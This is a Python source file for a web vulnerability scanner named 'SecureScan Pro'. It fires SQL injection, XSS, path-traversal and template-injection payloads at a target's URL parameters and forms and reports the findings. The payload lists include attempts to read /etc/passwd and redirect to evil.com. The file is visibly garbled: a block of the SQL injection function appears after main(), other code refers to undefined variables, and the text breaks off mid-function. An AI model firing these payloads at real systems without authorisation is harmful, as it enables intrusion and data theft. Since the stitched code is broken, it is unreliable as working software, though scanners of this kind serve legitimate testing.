#!/usr/bin/env python3
"""
SecureScan Pro - Advanced Web Vulnerability Scanner v3.0
Enhanced with realistic detection methods and working payloads
"""

import requests
import argparse
import json
import time
import smtplib
import urllib.parse
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime
from urllib.parse import urljoin, urlparse, parse_qs
import re
import sys
import random
import socket
from bs4 import BeautifulSoup
import warnings
warnings.filterwarnings(
    "ignore",
     category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

# ANSI Color codes for terminal output


class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'


class RealWorldVulnerabilityScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })
        self.session.verify = False  # Disable SSL verification for testing
        self.vulnerabilities = []
        self.stats = {
    'critical': 0,
    'high': 0,
    'medium': 0,
    'low': 0,
     'info': 0}
        self.discovered_urls = set()
        self.forms = []

        # Realistic payloads that work in real scenarios
        self.payloads = {
            'sqli': {
                'error_based': [
                    "'",
                    "''",
                    "' OR '1'='1",
                    "' OR 1=1--",
                    "admin'--",
                    "' OR 'x'='x",
                    "') OR ('1'='1",
                    "1' OR '1'='1'#",
                    "1' OR 1=1 LIMIT 1--",
                    "1' UNION SELECT 1,2,3--",
                    "1' AND SLEEP(5)--",
                    "1' WAITFOR DELAY '0:0:5'--"
                ],
                'blind': [
                    "1' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
                    "1' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>64--",
                    "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
                ]
            },
            'xss': {
                'reflected': [
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert('XSS')>",
                    "<svg onload=alert('XSS')>",
                    "javascript:alert('XSS')",
                    "<iframe src=javascript:alert('XSS')>",
                    "<body onload=alert('XSS')>",
                    "\"><script>alert('XSS')</script>",
                    "';alert('XSS');//",
                    "</script><script>alert('XSS')</script>",
                    "<img src=\"javascript:alert('XSS')\">",
                    "<marquee onstart=alert('XSS')>",
                    "<details ontoggle=alert('XSS') open>"
                ],
                'dom': [
                    "#<script>alert('DOM-XSS')</script>",
                    "javascript:alert('DOM-XSS')",
                    "data:text/html,<script>alert('DOM-XSS')</script>"
                ]
            },
            'lfi': [
                "../etc/passwd",
                "../../etc/passwd",
                "../../../etc/passwd",
                "../../../../etc/passwd",
                "../../../../../etc/passwd",
                "../../../../../../etc/passwd",
                "../../../../../../../etc/passwd",
                "../../../../../../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "..\\..\\..\\windows\\win.ini",
                "/etc/passwd",
                "C:\\windows\\system32\\drivers\\etc\\hosts",
                "php://filter/convert.base64-encode/resource=../config.php",
                "php://filter/read=convert.base64-encode/resource=index.php",
                "/proc/self/environ",
                "/var/log/apache2/access.log",
                "....//....//....//etc/passwd"
            ],
            'open_redirect': [
                "//evil.com",
                "http://evil.com",
                "https://evil.com",
                "/\\evil.com",
                "//google.com",
                "http://google.com",
                "https://google.com",
                "javascript:alert('redirect')",
                "data:text/html,<script>location='http://evil.com'</script>"
            ],
            'ssti': [
                "{{7*7}}",
                "${7*7}",
                "#{7*7}",
                "<%=7*7%>",
                "{{config}}",
                "{{request}}",
                "${@print(42)}",
                "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
                "${<%[%'\"}}%\\."
            ]
        }

    def print_banner(self):
        banner = f"""
{Colors.CYAN}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════════╗
║                    🛡️  SecureScan Pro v3.0                    ║
║            Enhanced Web Vulnerability Scanner                 ║
║                  Real-World Testing Edition                   ║
╚═══════════════════════════════════════════════════════════════╝
{Colors.END}
        """
        print(banner)

    def validate_url(self, url):
        """Validate and normalize URL"""
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url

        try:
            result = urlparse(url)
            return all([result.scheme, result.netloc]), url
        except:
            return False, url

    def test_connection(self, url):
        """Test if the target is reachable"""
        try:
            response = self.session.get(url, timeout=10, allow_redirects=True)
            return True, response.status_code, response
        except requests.exceptions.RequestException as e:
            return False, str(e), None

    def discover_endpoints(self, base_url, response):
        """Discover URLs and forms from the target"""
        print(
            f"{Colors.BLUE}[*] Discovering endpoints and forms...{Colors.END}")

        try:
            soup = BeautifulSoup(response.text, 'html.parser')

            # Find all links
            for link in soup.find_all('a', href=True):
                href = link['href']
                full_url = urljoin(base_url, href)
                if urlparse(full_url).netloc == urlparse(base_url).netloc:
                    self.discovered_urls.add(full_url)

            # Find all forms
            for form in soup.find_all('form'):
                form_data = {
                    'action': urljoin(base_url, form.get('action', '')),
                    'method': form.get('method', 'get').lower(),
                    'inputs': []
                }

                for input_field in form.find_all(
                    ['input', 'textarea', 'select']):
                    input_data = {
                        'name': input_field.get('name', ''),
                        'type': input_field.get('type', 'text'),
                        'value': input_field.get('value', '')
                    }
                    if input_data['name']:
                        form_data['inputs'].append(input_data)

                if form_data['inputs']:
                    self.forms.append(form_data)

            print(
                f"{Colors.GREEN}[*] Discovered {len(self.discovered_urls)} URLs and {len(self.forms)} forms{Colors.END}")

        except Exception as e:
            print(
                f"{Colors.YELLOW}[!] Error during discovery: {str(e)}{Colors.END}")

    def test_sql_injection_realistic(self, url):
        """Enhanced SQL injection testing with realistic detection"""
        print(
            f"{Colors.BLUE}[*] Testing SQL Injection (Enhanced)...{Colors.END}")

        # Test URL parameters
        parsed_url = urlparse(url)
        if parsed_url.query:
            params = parse_qs(parsed_url.query)

            for param_name in params:
                original_value = params[param_name][0] if params[param_name] else ''

                for payload in self.payloads['sqli']['error_based']:
                    test_params = params.copy()
                    test_params[param_name] = [payload]

                    test_url = f"{
    parsed_url.scheme}://{
        parsed_url.netloc}{
            parsed_url.path}?{
                urllib.parse.urlencode(
                    test_params,
                     doseq=True)}"

                    try:
                        response = self.session.get(test_url, timeout=5)

                        # Check for SQL error patterns
                        sql_errors = [
                            r"mysql_fetch_array\(\)",
                            r"ORA-\d{5}",
                            r"Microsoft.*ODBC.*SQL Server",
                            r"PostgreSQL.*ERROR",
                            r"Warning.*mysql_.*",
                            r"valid MySQL result",
                            r"MySqlClient\.",
                            r"sqlite3\.OperationalError",
                            r"SQLite.*error",
                            r"SQL syntax.*MySQL",
                            r"Warning.*pg_.*",
                            r"valid PostgreSQL result",
                            r"Npgsql\.",
                            r"Oracle error",
                            r"SQL Server.*error",
                            r"Incorrect syntax near"
                        ]

                        for error_pattern in sql_errors:
                            if re.search(
                                error_pattern, response.text, re.IGNORECASE):
                                self.add_vulnerability(
                                    'default_credentials',
                                    'critical',
                                    form['action'],
                                    f"{username}:{password}",
                                    f"Default credentials found: {username}/{password}",
                                    "Immediate security risk - change credentials"
                                )
                                break

                    except requests.exceptions.RequestException:
                        continue

    def add_vulnerability(self, vuln_type, severity, url,
                          payload, description, additional_info=""):
        """Add vulnerability to results with enhanced information"""
        vulnerability = {
            'type': vuln_type,
            'severity': severity,
            'url': url,
            'payload': payload,
            'description': description,
            'additional_info': additional_info,
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }

        self.vulnerabilities.append(vulnerability)
        self.stats[severity] += 1

        # Real-time output with better formatting
        severity_colors = {
            'critical': Colors.RED,
            'high': Colors.MAGENTA,
            'medium': Colors.YELLOW,
            'low': Colors.CYAN,
            'info': Colors.BLUE
        }

        color = severity_colors.get(severity, Colors.WHITE)

        print(
    f"{color}[+] {
        severity.upper()}: {
            vuln_type.replace(
                '_',
                ' ').upper()}{
                    Colors.END}")
        print(f"    {Colors.BOLD}Description:{Colors.END} {description}")
        print(f"    {Colors.BOLD}URL:{Colors.END} {url}")
        print(f"    {Colors.BOLD}Payload:{Colors.END} {payload}")
        if additional_info:
            print(f"    {Colors.BOLD}Details:{Colors.END} {additional_info}")
        print()

    def run_comprehensive_scan(
        self, target_url, scan_types=None, email_config=None):
        """Run comprehensive vulnerability scan"""

        # Validate URL
        is_valid, normalized_url = self.validate_url(target_url)
        if not is_valid:
            print(f"{Colors.RED}[!] Invalid URL format{Colors.END}")
            return False

        target_url = normalized_url
        print(f"{Colors.GREEN}[*] Target: {target_url}{Colors.END}")
        print(f"{Colors.GREEN}[*] Testing connection...{Colors.END}")

        # Test connection
        connected, status, response = self.test_connection(target_url)
        if not connected:
            print(
                f"{Colors.RED}[!] Cannot connect to target: {status}{Colors.END}")
            return False

        print(
            f"{Colors.GREEN}[*] Connection successful (Status: {status}){Colors.END}")

        # Discover endpoints and forms
        self.discover_endpoints(target_url, response)

        # Add discovered URLs to test
        test_urls = [target_url]
        # Limit to first 10 discovered URLs
        test_urls.extend(list(self.discovered_urls)[:10])

        print(
            f"{Colors.GREEN}[*] Starting comprehensive vulnerability scan...{Colors.END}")
        print(f"{Colors.GREEN}[*] Testing {len(test_urls)} URLs{Colors.END}")
        print()

        # Run vulnerability tests
        scan_functions = {
            'sqli': self.test_sql_injection_realistic,
            'xss': self.test_xss_realistic,
            'lfi': self.test_lfi_realistic,
            'open_redirect': self.test_open_redirect_realistic,
            'ssti': self.test_ssti_realistic
        }

        if not scan_types or 'all' in scan_types:
            scan_types = list(scan_functions.keys()) + ['common']

        # Run selected scans on all test URLs
        for url in test_urls:
            for scan_type in scan_types:
                if scan_type in scan_functions:
                    try:
                        scan_functions[scan_type](url)
                    except Exception as e:
                        print(
                            f"{Colors.YELLOW}[!] Error in {scan_type} scan: {str(e)}{Colors.END}")

        # Run common vulnerability checks
        if 'common' in scan_types:
            self.scan_common_vulnerabilities(target_url)

        # Generate report
        self.generate_comprehensive_report(target_url)

        # Send email if configured
        if email_config and self.vulnerabilities:
            self.send_email_alert(email_config, target_url)

        return True

    def generate_comprehensive_report(self, target_url):
        """Generate comprehensive vulnerability report"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}{'=' * 80}{Colors.END}")
        print(
    f"{
        Colors.BOLD}{
            Colors.CYAN}                         COMPREHENSIVE SECURITY REPORT                        {
                Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}{'=' * 80}{Colors.END}")

        print(f"\n{Colors.BOLD}Target URL:{Colors.END} {target_url}")
        print(
    f"{
        Colors.BOLD}Scan Date:{
            Colors.END} {
                datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{Colors.BOLD}URLs Tested:{Colors.END} {len(self.discovered_urls) + 1}")
        print(f"{Colors.BOLD}Forms Found:{Colors.END} {len(self.forms)}")
        print(
            f"{Colors.BOLD}Total Vulnerabilities:{Colors.END} {len(self.vulnerabilities)}")

        # Risk Assessment
        risk_score = (self.stats['critical'] * 10 + self.stats['high'] * 7 +
                     self.stats['medium'] * 4 + self.stats['low'] * 1)

        if risk_score >= 50:
            risk_level = f"{Colors.RED}CRITICAL{Colors.END}"
        elif risk_score >= 30:
            risk_level = f"{Colors.MAGENTA}HIGH{Colors.END}"
        elif risk_score >= 15:
            risk_level = f"{Colors.YELLOW}MEDIUM{Colors.END}"
        elif risk_score > 0:
            risk_level = f"{Colors.CYAN}LOW{Colors.END}"
        else:
            risk_level = f"{Colors.GREEN}MINIMAL{Colors.END}"

        print(
            f"{Colors.BOLD}Risk Level:{Colors.END} {risk_level} (Score: {risk_score})")

        # Statistics
        print(f"\n{Colors.BOLD}SEVERITY BREAKDOWN:{Colors.END}")
        total_high_critical = self.stats['critical'] + self.stats['high']

        print(
    f"  {
        Colors.RED}🔴 Critical: {
            self.stats['critical']} {
                '⚠️ IMMEDIATE ACTION REQUIRED' if self.stats['critical'] > 0 else ''}{
                    Colors.END}")
        print(
    f"  {
        Colors.MAGENTA}🟠 High:     {
            self.stats['high']} {
                '⚠️ HIGH PRIORITY' if self.stats['high'] > 0 else ''}{
                    Colors.END}")
        print(
    f"  {
        Colors.YELLOW}🟡 Medium:   {
            self.stats['medium']}{
                Colors.END}")
        print(f"  {Colors.CYAN}🔵 Low:      {self.stats['low']}{Colors.END}")
        print(f"  {Colors.BLUE}ℹ️  Info:     {self.stats['info']}{Colors.END}")

        if total_high_critical > 0:
            print(
    f"\n{
        Colors.RED}{
            Colors.BOLD}⚠️  WARNING: {total_high_critical} high/critical vulnerabilities found!{
                Colors.END}")
            print(f"{Colors.RED}   Immediate remediation recommended.{Colors.END}")

        # Group vulnerabilities by type
        vuln_by_type = {}
        for vuln in self.vulnerabilities:
            vuln_type = vuln['type']
            if vuln_type not in vuln_by_type:
                vuln_by_type[vuln_type] = []
            vuln_by_type[vuln_type].append(vuln)

        if not self.vulnerabilities:
            print(
    f"\n{
        Colors.GREEN}✅ EXCELLENT! No vulnerabilities detected!{
            Colors.END}")
            print(
    f"{
        Colors.GREEN}   The target appears to be secure against tested attack vectors.{
            Colors.END}")
        else:
            print(f"\n{Colors.BOLD}DETAILED FINDINGS BY CATEGORY:{Colors.END}")
            print("─" * 80)

            for vuln_type, vulns in vuln_by_type.items():
                print(
    f"\n{
        Colors.BOLD}{
            Colors.UNDERLINE}{
                vuln_type.replace(
                    '_',
                    ' ').upper()} ({
                        len(vulns)} issues):{
                            Colors.END}")

                for i, vuln in enumerate(vulns, 1):
                    severity_colors = {
                        'critical': Colors.RED,
                        'high': Colors.MAGENTA,
                        'medium': Colors.YELLOW,
                        'low': Colors.CYAN,
                        'info': Colors.BLUE
                    }

                    color = severity_colors.get(vuln['severity'], Colors.WHITE)

                    print(
    f"\n  {color}#{i} [{
        vuln['severity'].upper()}]{
            Colors.END} {
                vuln['description']}")
                    print(f"     URL: {vuln['url']}")
                    if len(str(vuln['payload'])) > 100:
                        print(f"     Payload: {str(vuln['payload'])[:100]}...")
                    else:
                        print(f"     Payload: {vuln['payload']}")

                    if vuln['additional_info']:
                        print(f"     Details: {vuln['additional_info']}")
                    print(f"     Detected: {vuln['timestamp']}")

        # Recommendations
        print(f"\n{Colors.BOLD}SECURITY RECOMMENDATIONS:{Colors.END}")
        print("─" * 50)

        recommendations = {
            'sqli': "• Implement parameterized queries and input validation\n• Use prepared statements\n• Apply least privilege principle to database accounts",
            'xss': "• Implement proper output encoding/escaping\n• Use Content Security Policy (CSP)\n• Validate and sanitize all user inputs",
            'lfi': "• Avoid user input in file paths\n• Implement whitelist-based file access\n• Use proper access controls",
            'open_redirect': "• Validate redirect URLs against whitelist\n• Avoid user-controlled redirects\n• Implement proper URL validation",
            'ssti': "• Avoid user input in template expressions\n• Use safe template engines\n• Implement input validation",
            'security_headers': "• Implement all recommended security headers\n• Configure CSP, HSTS, and frame options",
            'directory_listing': "• Disable directory browsing\n• Configure proper directory permissions",
            'backup_files': "• Remove backup files from web directory\n• Implement proper deployment procedures",
            'default_credentials': "• Change all default credentials immediately\n• Implement strong password policies\n• Enable multi-factor authentication"
        }

        for vuln_type in vuln_by_type.keys():
            if vuln_type in recommendations:
                print(
    f"\n{
        Colors.YELLOW}📋 {
            vuln_type.replace(
                '_',
                ' ').title()}:{
                    Colors.END}")
                print(f"   {recommendations[vuln_type]}")

        print(f"\n{Colors.CYAN}{'=' * 80}{Colors.END}")

        # Summary
        if self.vulnerabilities:
            print(
    f"\n{
        Colors.RED}🚨 SECURITY ALERT: This application has security vulnerabilities!{
            Colors.END}")
            print(f"{Colors.YELLOW}📋 Recommended actions:{Colors.END}")
            print(f"   1. Address critical and high severity issues immediately")
            print(f"   2. Implement security best practices")
            print(f"   3. Conduct regular security assessments")
            print(f"   4. Consider implementing a Web Application Firewall (WAF)")
        else:
            print(f"\n{Colors.GREEN}🛡️  SECURITY STATUS: GOOD{Colors.END}")
            print(
                f"{Colors.GREEN}   Continue following security best practices!{Colors.END}")

    def send_email_alert(self, email_config, target_url):
        """Send detailed email alert"""
        try:
            print(
                f"\n{Colors.BLUE}[*] Sending comprehensive security report via email...{Colors.END}")

            msg = MIMEMultipart()
            msg['From'] = email_config['from_email']
            msg['To'] = email_config['to_email']
            msg['Subject'] = f"🚨 Security Assessment Report - {
    urlparse(target_url).netloc}"

            # Calculate risk score
            risk_score = (self.stats['critical'] * 10 + self.stats['high'] * 7 +
                         self.stats['medium'] * 4 + self.stats['low'] * 1)

            risk_level = "CRITICAL" if risk_score >= 50 else \
                        "HIGH" if risk_score >= 30 else \
                        "MEDIUM" if risk_score >= 15 else \
                        "LOW" if risk_score > 0 else "MINIMAL"

            body = f"""
Security Assessment Report - {urlparse(target_url).netloc}
═══════════════════════════════════════════════════════════════

🎯 TARGET INFORMATION:
   URL: {target_url}
   Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
   URLs Tested: {len(self.discovered_urls) + 1}
   Forms Analyzed: {len(self.forms)}

🚨 RISK ASSESSMENT:
   Risk Level: {risk_level}
   Risk Score: {risk_score}/100
   Total Vulnerabilities: {len(self.vulnerabilities)}

📊 SEVERITY BREAKDOWN:
   🔴 Critical: {self.stats['critical']} {'⚠️  IMMEDIATE ACTION REQUIRED!' if self.stats['critical'] > 0 else ''}
   🟠 High:     {self.stats['high']} {'⚠️  HIGH PRIORITY!' if self.stats['high'] > 0 else ''}
   🟡 Medium:   {self.stats['medium']}
   🔵 Low:      {self.stats['low']}
   ℹ️  Info:     {self.stats['info']}

"""

            if self.vulnerabilities:
                body += "🔍 TOP SECURITY ISSUES:\n───────────────────────\n\n"

                # Show top 10 most critical issues
                sorted_vulns = sorted(self.vulnerabilities, key=lambda x:
                                    {'critical': 4, 'high': 3, 'medium': 2,
                                        'low': 1, 'info': 0}[x['severity']],
                                    reverse=True)

                for i, vuln in enumerate(sorted_vulns[:10], 1):
                    body += f"{i}. [{
    vuln['severity'].upper()}] {
        vuln['type'].replace(
            '_', ' ').upper()}\n"
                    body += f"   Description: {vuln['description']}\n"
                    body += f"   URL: {vuln['url']}\n"
                    body += f"   Payload: {str(vuln['payload'])[:100]}{'...' if len(str(vuln['payload'])) > 100 else ''}\n"
                    if vuln['additional_info']:
                        body += f"   Details: {vuln['additional_info']}\n"
                    body += f"   Detected: {vuln['timestamp']}\n\n"

                if len(self.vulnerabilities) > 10:
                    body += f"... and {len(self.vulnerabilities) -
     10} more vulnerabilities.\n\n"

                body += """
⚡ IMMEDIATE ACTIONS REQUIRED:
────────────────────────────
1. Review and remediate all CRITICAL and HIGH severity vulnerabilities
2. Implement security best practices (input validation, output encoding, etc.)
3. Configure proper security headers
4. Remove any exposed backup files or directories
5. Change default credentials immediately
6. Consider implementing a Web Application Firewall (WAF)
7. Conduct regular security assessments

"""
            else:
                body += """
✅ EXCELLENT SECURITY POSTURE!
─────────────────────────────
No vulnerabilities were detected during this assessment.
Continue following security best practices and conduct regular security reviews.

"""

            body += f"""
📋 SCAN DETAILS:
───────────────
• Scanner: SecureScan Pro v3.0
• Scan Type: Comprehensive Web Application Security Assessment
• Test Coverage: SQL Injection, XSS, LFI, Open Redirect, SSTI, Security Headers, etc.
• Total Tests: {len(self.discovered_urls) + 1} URLs analyzed

⚠️  DISCLAIMER:
This automated scan provides an initial security assessment.
Manual testing and code review are recommended for comprehensive security evaluation.

═══════════════════════════════════════════════════════════════
SecureScan Pro - Advanced Web Vulnerability Scanner
Report Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
═══════════════════════════════════════════════════════════════
"""

            msg.attach(MIMEText(body, 'plain'))

            # Send email
            server = smtplib.SMTP(
    email_config['smtp_server'],
     email_config['smtp_port'])
            server.starttls()
            server.login(email_config['from_email'], email_config['password'])
            server.send_message(msg)
            server.quit()

            print(
    f"{
        Colors.GREEN}✅ Comprehensive security report sent successfully to {
            email_config['to_email']}{
                Colors.END}")

        except Exception as e:
            print(
                f"{Colors.RED}[!] Failed to send email: {str(e)}{Colors.END}")

    def save_results_to_file(self, filename):
        """Save comprehensive results to JSON file"""
        try:
            results = {
                'scan_info': {
                    'scanner_version': 'SecureScan Pro v3.0',
                    'timestamp': datetime.now().isoformat(),
                    'total_vulnerabilities': len(self.vulnerabilities),
                    'urls_tested': len(self.discovered_urls) + 1,
                    'forms_found': len(self.forms),
                    'risk_score': (self.stats['critical'] * 10 + self.stats['high'] * 7 +
                                  self.stats['medium'] * 4 + self.stats['low'] * 1),
                    'statistics': self.stats
                },
                'discovered_urls': list(self.discovered_urls),
                'forms_found': self.forms,
                'vulnerabilities': self.vulnerabilities
            }

            with open(filename, 'w') as f:
                json.dump(results, f, indent=2, ensure_ascii=False)

            print(f"{Colors.GREEN}✅ Detailed results saved to {filename}{Colors.END}")

        except Exception as e:
            print(
                f"{Colors.RED}[!] Failed to save results: {str(e)}{Colors.END}")


def main():
    parser = argparse.ArgumentParser(
        description="SecureScan Pro v3.0 - Enhanced Web Vulnerability Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 scanner.py -u https://example.com
  python3 scanner.py -u https://example.com -t sqli xss lfi
  python3 scanner.py -u https://example.com --email security@company.com
  python3 scanner.py -u https://example.com -t all --output results.json -v
  python3 scanner.py -u http://testphp.vulnweb.com --email alerts@company.com --from-email scanner@gmail.com --email-password app-password

Test with vulnerable applications:
  • http://testphp.vulnweb.com (Acunetix Test Site)
  • http://demo.testfire.net (IBM Security Test Site)
  • https://juice-shop.herokuapp.com (OWASP Juice Shop)
        """
    )

    parser.add_argument(
    '-u',
    '--url',
    required=True,
     help='Target URL to scan')
    parser.add_argument('-t', '--types', nargs='+',
                       choices=[
    'sqli',
    'xss',
    'lfi',
    'open_redirect',
    'ssti',
    'common',
     'all'],
                       default=['all'], help='Vulnerability types to test')
    parser.add_argument('--email', help='Email address for security alerts')
    parser.add_argument('--from-email', help='Sender email address')
    parser.add_argument(
    '--email-password',
     help='Email password or app password')
    parser.add_argument(
    '--smtp-server',
    default='smtp.gmail.com',
     help='SMTP server (default: smtp.gmail.com)')
    parser.add_argument(
    '--smtp-port',
    type=int,
    default=587,
     help='SMTP port (default: 587)')
    parser.add_argument('--output', '-o', help='Save results to JSON file')
    parser.add_argument(
    '--verbose',
    '-v',
    action='store_true',
     help='Verbose output')

    args = parser.parse_args()

    try:
        # Initialize scanner
        scanner = RealWorldVulnerabilityScanner()
        scanner.print_banner()

        # Configure scan types
        scan_types = args.types if 'all' not in args.types else [
            'sqli', 'xss', 'lfi', 'open_redirect', 'ssti', 'common']
        print(
            f"{Colors.GREEN}[*] Scan types: {', '.join(scan_types)}{Colors.END}")

        # Configure email if provided
        email_config = None
        if args.email:
            if not args.from_email or not args.email_password:
                print(
                    f"{Colors.YELLOW}[!] Email alerts enabled but missing credentials{Colors.END}")
                print(
                    f"{Colors.YELLOW}    Use --from-email and --email-password for email functionality{Colors.END}")
            else:
                email_config = {
                    'to_email': args.email,
                    'from_email': args.from_email,
                    'password': args.email_password,
                    'smtp_server': args.smtp_server,
                    'smtp_port': args.smtp_port
                }
                print(
                    f"{Colors.GREEN}[*] Email alerts configured: {args.email}{Colors.END}")

        # Run the comprehensive scan
        start_time = time.time()
        success = scanner.run_comprehensive_scan(
            args.url, scan_types, email_config)
        end_time = time.time()

        if success:
            print(
    f"\n{
        Colors.GREEN}✅ Comprehensive security scan completed in {
            end_time -
            start_time:.2f} seconds{
                Colors.END}")

            # Save results if requested
            if args.output:
                scanner.save_results_to_file(args.output)
        else:
            print(f"{Colors.RED}❌ Scan failed{Colors.END}")
            sys.exit(1)

    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}⚠️  Scan interrupted by user{Colors.END}")
        sys.exit(0)
    except Exception as e:
        print(f"{Colors.RED}❌ Unexpected error: {str(e)}{Colors.END}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
                                    'sqli',
                                    'high',
                                    test_url,
                                    payload,
                                    f"SQL injection detected via error pattern: {error_pattern}",
                                    f"Parameter: {param_name}"
                                )
                                break

                        # Time-based detection
                        if 'SLEEP' in payload or 'WAITFOR' in payload:
                            start_time = time.time()
                            response = self.session.get(test_url, timeout=10)
                            end_time = time.time()

                            if end_time - start_time > 4:  # 4+ second delay indicates SQL injection
                                self.add_vulnerability(
                                    'sqli',
                                    'high',
                                    test_url,
                                    payload,
                                    f"Time-based SQL injection detected (Response time: {end_time - start_time:.2f}s)",
                                    f"Parameter: {param_name}"
                                )

                    except requests.exceptions.RequestException:
                        continue

        # Test forms
        for form in self.forms:
            if not form['inputs']:
                continue

            for payload in self.payloads['sqli']['error_based'][:5]:  # Test first 5 payloads
                form_data = {}

                for input_field in form['inputs']:
                    if input_field['type'] in ['text', 'email', 'search', 'hidden']:
                        form_data[input_field['name']] = payload
                    elif input_field['type'] == 'password':
                        form_data[input_field['name']] = 'test123'
                    else:
                        form_data[input_field['name']] = input_field.get('value', 'test')

                try:
                    if form['method'] == 'post':
                        response = self.session.post(form['action'], data=form_data, timeout=5)
                    else:
                        response = self.session.get(form['action'], params=form_data, timeout=5)

                    # Check for SQL errors in form responses
                    sql_errors = [
                        "mysql_fetch_array",
                        "mysql_num_rows",
                        "ORA-01756",
                        "Microsoft OLE DB Provider for SQL Server",
                        "Unclosed quotation mark after the character string",
                        "PostgreSQL query failed",
                        "SQLite error"
                    ]

                    for error in sql_errors:
                        if error.lower() in response.text.lower():
                            self.add_vulnerability(
                                'sqli',
                                'high',
                                form['action'],
                                str(form_data),
                                f"SQL injection in form detected via error: {error}",
                                f"Form method: {form['method']}"
                            )
                            break

                except requests.exceptions.RequestException:
                    continue

    def test_xss_realistic(self, url):
        """Enhanced XSS testing with realistic detection"""
        print(f"{Colors.BLUE}[*] Testing Cross-Site Scripting (Enhanced)...{Colors.END}")

        # Test URL parameters
        parsed_url = urlparse(url)
        if parsed_url.query:
            params = parse_qs(parsed_url.query)

            for param_name in params:
                for payload in self.payloads['xss']['reflected']:
                    test_params = params.copy()
                    test_params[param_name] = [payload]

                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"

                    try:
                        response = self.session.get(test_url, timeout=5)

                        # Check if payload is reflected without proper encoding
                        if payload in response.text:
                            # Check if it's actually exploitable (not just reflected)
                            dangerous_chars = ['<script>', 'onerror=', 'onload=', 'javascript:', '<iframe']
                            if any(char in response.text for char in dangerous_chars):
                                self.add_vulnerability(
                                    'xss',
                                    'high',
                                    test_url,
                                    payload,
                                    "Reflected XSS - payload executed without encoding",
                                    f"Parameter: {param_name}"
                                )
                            else:
                                self.add_vulnerability(
                                    'xss',
                                    'medium',
                                    test_url,
                                    payload,
                                    "Potential XSS - payload reflected (check manual execution)",
                                    f"Parameter: {param_name}"
                                )

                        # Check for XSS in HTML attributes
                        if f'value="{payload}"' in response.text or f"value='{payload}'" in response.text:
                            self.add_vulnerability(
                                'xss',
                                'medium',
                                test_url,
                                payload,
                                "XSS in HTML attribute - potential for attribute-based XSS",
                                f"Parameter: {param_name}"
                            )

                    except requests.exceptions.RequestException:
                        continue

        # Test forms
        for form in self.forms:
            if not form['inputs']:
                continue

            for payload in self.payloads['xss']['reflected'][:3]:  # Test first 3 payloads
                form_data = {}

                for input_field in form['inputs']:
                    if input_field['type'] in ['text', 'email', 'search', 'textarea']:
                        form_data[input_field['name']] = payload
                    else:
                        form_data[input_field['name']] = input_field.get('value', 'test')

                try:
                    if form['method'] == 'post':
                        response = self.session.post(form['action'], data=form_data, timeout=5)
                    else:
                        response = self.session.get(form['action'], params=form_data, timeout=5)

                    if payload in response.text:
                        self.add_vulnerability(
                            'xss',
                            'high',
                            form['action'],
                            str(form_data),
                            "XSS in form submission - payload reflected in response",
                            f"Form method: {form['method']}"
                        )

                except requests.exceptions.RequestException:
                    continue

    def test_lfi_realistic(self, url):
        """Enhanced LFI testing with realistic detection"""
        print(f"{Colors.BLUE}[*] Testing Local File Inclusion (Enhanced)...{Colors.END}")

        parsed_url = urlparse(url)
        if parsed_url.query:
            params = parse_qs(parsed_url.query)

            for param_name in params:
                # Focus on parameters likely to be file-related
                if any(keyword in param_name.lower() for keyword in ['file', 'page', 'include', 'path', 'doc', 'url']):

                    for payload in self.payloads['lfi']:
                        test_params = params.copy()
                        test_params[param_name] = [payload]

                        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"

                        try:
                            response = self.session.get(test_url, timeout=5)

                            # Check for Linux file contents
                            linux_indicators = [
                                "root:x:0:0:",
                                "daemon:x:1:1:",
                                "bin:x:2:2:",
                                "sys:x:3:3:",
                                "nobody:x:"
                            ]

                            # Check for Windows file contents
                            windows_indicators = [
                                "[boot loader]",
                                "[operating systems]",
                                "Windows Registry Editor",
                                "# localhost name resolution",
                                "127.0.0.1       localhost"
                            ]

                            # Check for PHP file disclosure
                            php_indicators = [
                                "<?php",
                                "mysql_connect",
                                "database_password",
                                "$password",
                                "$username"
                            ]

                            all_indicators = linux_indicators + windows_indicators + php_indicators

                            for indicator in all_indicators:
                                if indicator in response.text:
                                    file_type = "Linux system file" if indicator in linux_indicators else \
                                               "Windows system file" if indicator in windows_indicators else \
                                               "PHP source code"

                                    self.add_vulnerability(
                                        'lfi',
                                        'high',
                                        test_url,
                                        payload,
                                        f"Local File Inclusion detected - {file_type} contents revealed",
                                        f"Parameter: {param_name}, Found: {indicator}"
                                    )
                                    break

                        except requests.exceptions.RequestException:
                            continue

    def test_open_redirect_realistic(self, url):
        """Enhanced Open Redirect testing"""
        print(f"{Colors.BLUE}[*] Testing Open Redirect (Enhanced)...{Colors.END}")

        parsed_url = urlparse(url)
        if parsed_url.query:
